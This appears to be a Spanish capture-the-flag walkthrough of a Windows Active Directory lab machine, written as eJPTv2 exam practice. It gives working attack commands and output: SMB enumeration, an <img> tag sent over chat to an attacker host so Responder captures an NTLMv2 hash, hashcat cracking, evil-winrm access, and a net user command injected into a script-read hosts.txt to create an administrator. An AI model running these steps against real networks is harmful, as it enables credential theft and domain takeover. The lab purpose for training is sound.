Por esta vez, tenemos nuestra primera maquina dificil, nos ayudara bastante en nuestro examen eJPTv2. Utilizaremos las herramientas **crackmapexec** para atacar un servidor que no posee **ssh***. Penetraremos el sistema utilizando diversas tecnicas y modificando usuarios y encontraremos posibles scripts que nos permitan escalar privilegios. Una maquina muy buena para practicar **smbclient**.


# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```python
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-06-05 06:09:36 EDT for 120s
Not shown: 65498 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE             REASON          VERSION
53/tcp    open  domain              syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http                syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec        syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-06-05 10:10:23Z)
135/tcp   open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp   open  microsoft-ds?       syn-ack ttl 127
464/tcp   open  kpasswd5?           syn-ack ttl 127
593/tcp   open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?            syn-ack ttl 127
2179/tcp  open  vmrdp?              syn-ack ttl 127
3268/tcp  open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?   syn-ack ttl 127
3389/tcp  open  ms-wbt-server       syn-ack ttl 127 Microsoft Terminal Services
5222/tcp  open  jabber              syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
5223/tcp  open  ssl/jabber          syn-ack ttl 127
5229/tcp  open  jaxflow?            syn-ack ttl 127
5262/tcp  open  jabber              syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
5263/tcp  open  ssl/jabber          syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
5269/tcp  open  xmpp                syn-ack ttl 127 Wildfire XMPP Client
5270/tcp  open  ssl/xmpp            syn-ack ttl 127 Wildfire XMPP Client
5275/tcp  open  jabber              syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
5276/tcp  open  ssl/jabber          syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
5985/tcp  open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7070/tcp  open  http                syn-ack ttl 127 Jetty 9.4.18.v20190429
7443/tcp  open  ssl/http            syn-ack ttl 127 Jetty 9.4.18.v20190429
7777/tcp  open  socks5              syn-ack ttl 127 (No authentication; connection failed)
9090/tcp  open  zeus-admin?         syn-ack ttl 127
9091/tcp  open  ssl/xmltec-xmlmail? syn-ack ttl 127
9389/tcp  open  mc-nmf              syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
49911/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC

```

Tenemos para entretenernos, por la cantidad de puertos abiertos no sabremos bien por donde comenzar. De primeras, sabemos que podemos navegar a su servidor web,asique averiguaremos alguna forma de enumerar usuarios a simple vista, entre otras cosas. Luego,  podriamos realizar una enumeracion con `gobuster`, pero antes, como tenemos el puerto 139/SMB abierto, realizamos una enumeracion para ver si conseguimos algo de informacion adicional, como alguna nota o posibles usuarios.

# Enumeration

De primeras, abrimos `Page Source` y notaremos un dominio con `fire` como subdominio. El dominio que encontramos seria `fire.windcorp.thm`. Con esto en mano, lo agregaremos a **/etc/hosts**.

```bash
IPTARGET     windcorp.thm
IPTARGET     fire.windcorp.thm
```

Dentro del servidor web, veremos una seccion donde se puede resetear la password, necesitaremos el nombre de usuario con un secreto que en este caso utilizan preguntas.
Si miramos nuevamente el `Page Source` de la pagina, encontraremos 3 usuarios con imagen. Por suerte, dentro de la ruta donde se almacena la imagen, notaremos que encontramos nuestro usuario con su secreto a la vista. **lilyle:Sparky**. Una vez pongamos esto en resetear password, obtendremos una nueva password para el usuario lilyle.

Lo siguiente que haremos, es utilizar la herramienta `crackmapexec`  para verificar que tendremos acceso como lilyle y asi poder enumerar aun mas la maquina.

```bash
crackmapexec smb DOMAIN -u lilyle -p PASS

SMB         windcorp.thm    445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\lilyle:
```

Con esta respuesta, validaremos que tenemos acceso con nuestro usuario lilyle.
Para seguir enumerando, seguimos usando el puerto SMB con las herramientas `smbmap & smbclient`

```bash
smbmap -H DOMAIN -u USER -p PASS -R

Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	


```

Con este resultado, podremos entrar como lilyle usando `smbclient` enumerando el directorio `Shared` , tambien podremos enumerar otros directorios como `Users` si queremos obtener informacion acerca de los usuarios, solo podremos hacer una lectura.

```bash
smbclient //windcorp.thm/Shared -U lilyle --password REDACTED


smb: \> ls
  .                                   D        0  Fri May 29 20:45:42 2020
  ..                                  D        0  Fri May 29 20:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 11:32:36 2020
  spark_2_8_3.deb                     A 29526628  Fri May 29 20:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 07:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 07:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 07:07:24 2020

```

Obtenemos nuestra flag, y de paso, crearemos un directorio donde almacenaremos toda la informacion adquirida con `mget *`.

# Intrusion

Antes de realizar nuestra intrusion, tendremos que hacer un poco de researh acerca de lo que obtuvimos anteriormente, para buscar de la forma mas facil y encontrar posibles bypass lo mejor es buscar siempre por el nombre de la aplicacion o ejecutable que obtuvimos seguido de un **exploit** o **github** . Se nos facilitara la busqueda y podemos buscar con mas probabilidades.

Encontraremos este repositorio de github, que utilizando **Responder.py** envenenaremos el trafico en nuestra maquina atacante y luego ingresaremos a la cuenta de lilyle en **Spark**. Acto seguido, le mandaremos un mensaje a un miembro de la organizacion con una etiqueta `<img` con nuestra direccion ip de nuestra maquina atacante y desde el responder obtener el hash **NTLM** del miembro de la organizacion.

Explicado el paso, primero descomprimiremos el archivo que nos transferimos anteriormente y ejecutaremos **Spark**

```bash
sudo dkpg -i spark_2_8_3.deb
spark
```

Una vez ejecutado spark, entraremos con las credenciales de lilyle. Si tienes problemas para iniciar sesion, tendras que ir al apartado **Advanced** y tildar las opciones **Accept certificate & Disabled certificate**.

Dentro, primeramente ejecutaremos nuestro Responder.py, si no lo tenes en tu sistema podes conseguirlo aca https://github.com/SpiderLabs/Responder.
Iniciaremos nuestro Responder `sudo python2 Responder.py -I tun0`
Al hacer esta accion, ya estaremos envenenando el trafico.

Nos dirigimos a nuestro **Spark** y  le enviaremos un mensaje a nuestro amigo de la corporacion, acuerdense que en el `page Source` del servidor web encontraremos los mails de todos los miembres de la organizacion, intente probar algunos y tuve exito con este miembro `buse@fire.windcorp.thm`.

Procedemos a iniciar una conversacion con esta persona, agregando nuestra etiqueta `<img` para asi, en nuestro responder, nos llueva su hash NTLM.

Nuestro mensaje hacia buse seria :

```bash
Hola buse, tengo que pedirte un favor enorme<img src="http://LHOST/test.jpg">

## En nuestro Responder

[+] Listening for events...
[HTTP] NTLMv2 Client   : IPTARGET
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:9D9015D344D844D7F7797000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000953FC303D67FE978567F26A0C2DCF64061C9C7710316A579F513F56F7D6C02B50A00100000000000000000000000000000000000090000000000000000000000
```


Una vez obtenido este hash, tenemos que crackerlo. Para esta tarea, usaremos `hashcat` para descubrir la password de buse. Primero hay que averiguar que tipo de hash es, en nuestro responder nos dira el tipo de hash o bien podemos utilizar `hashid` para averiguar esto. Una vez descubierto, procedemos a crackearlo. Seguiremos estos pasos:

```bash
hashid hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

Tendremos sus credenciales,corroboraremos si tenemos acceso como buse con crackmapexc y enumearemos todo su contenido.

```bash
crackmapexec smb DOMAIN -u buse -p PASS

SMB         windcorp.thm    445    FIRE             [+] 

# smbmap

smbmap -H DOMAIN -u buse -p PASS -R

.\Users\buse\Desktop\*
	dw--w--w--                0 Thu May  7 06:01:26 2020	.
	dw--w--w--                0 Thu May  7 06:01:26 2020	..
	dr--r--r--                0 Thu May  7 06:00:17 2020	Also stuff
	fr--r--r--              282 Fri May  1 06:25:41 2020	desktop.ini
	fr--r--r--               45 Sat May  2 14:53:18 2020	Flag 2.txt
	fr--r--r--               37 Fri May  1 11:33:56 2020	Notes.txt
	dr--r--r--                0 Thu May  7 05:58:43 2020	Stuff

```

Para hacer esto mas comodo, necesitamos una shell interactiva para movernos entre direcorios y tambien poder transferirnos archivos si queremos. Para esto, vamos a utilizar una herramienta llamada `evil-winrm` que es una herramienta de linea de comandos y permite la administración remota de sistemas.

Ejecutamos evil-winrm :

```bash
evil-winrm -u buse -p PASS -i windcorp.thm

Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
'*Evil-WinRM* PS C:\Users\buse\Documents>' 

```

Nos dirigimos al escritorio de buse y encotraremos nuestra flag 2

# Priv. Escalation

Para empezar a escalar privilegios, primero debemos enumerar un poco la maquina, lo que hago es dirigirme al directorio C:\ para empezar a buscar algo. Por suerte, hay una carpeta llamada **scripts** que contiene un script escrito en PowerShell y archivo .txt. De primeras, le echamos un vistazo al scrip, Basicamente es un script que monitorea en bucle.

Debemos echar un vistazo a la parte donde dice :

```Powershell
get-content C:\Users\brittanycr\hosts.txt
```

Podremos ver que utiliza cmd para adquirir el contenido alojado en el usuario brittany. Lo que tenemos que hacer en este caso, es adquirir este archivo de texto y sobreescribirlo agregando un nuevo usuario con privilegios Administrador.

Asique lo primero que tenemos que hacer, es cambiarle la password a brittanycr para poder acceder via `smbclient`.

```powershell
net user brittanycr Hellothere! /domain
```

Una vez cambiada, podremos corroborar con crackmapexec si el comando funciono correctamente.

```bash
crackmapexec smb windcorp.thm -u brittanycr -p Hellothere!

SMB         windcorp.thm    445    FIRE             [*] Windows 10.0 
SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\brittanycr:Hellothere!
```

Una vez hecho esto, procedemos a logearnos con smbclient y obtener el archivo de texto.

```bash
smbclient //windcorp.thm/Users -U brittanycr --password Hellothere!

smb: \> cd brittanycr\
smb: \brittanycr\> ls
  .                                   D        0  Sat May  2 19:36:46 2020
  ..                                  D        0  Sat May  2 19:36:46 2020
  hosts.txt                           A       22  Sun May  3 09:44:57 2020
smb: \brittanycr\> get hosts.txt
```

Una vez en nuestro poder el archivo, tenemos que modificarlo y agregarle una consulta a powershell para que nos cree un nuevo usuario con privilegios de Administrador.

```bash
nano hosts.txt

;net user ggh YouArePwned! /add;net localgroup Administrators ggh /add
```

Pasaremos a poner el archivo nuevamente al smbclient y esperaremos alrededor de 3-5 min para que se el script obtenga el contenido de hosts.txt. El script funciona cada 45 segundos, pero nunca esta de mas esperar un poco extra.

```bash
smbclient: \brittanycr\> put hosts.txt
```

Utilizamos nuevamente crackmapexec para saber si todo salio correctamente seguido de ejectuar nuevamente `evil-winrm` para acceder al directorio **Administrator** y obtener nuestra ultima flag!

```bash
crackmapexec smb windcorp.thm -u ggh -p YouArePwned!

SMB         windcorp.thm    445    FIRE             [*] Windows 10.0 Build 17763 
SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\ggwindcorp.thm\ggh:YouArePwned! (Pwn3d!)

## Evil-WinRM

evil-winrm -u ggh -p YouArePwned! -i windcorp.thm

Evil-WinRM* PS C:\Users\ggh\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2020   1:22 AM             47 Flag3.txt

```

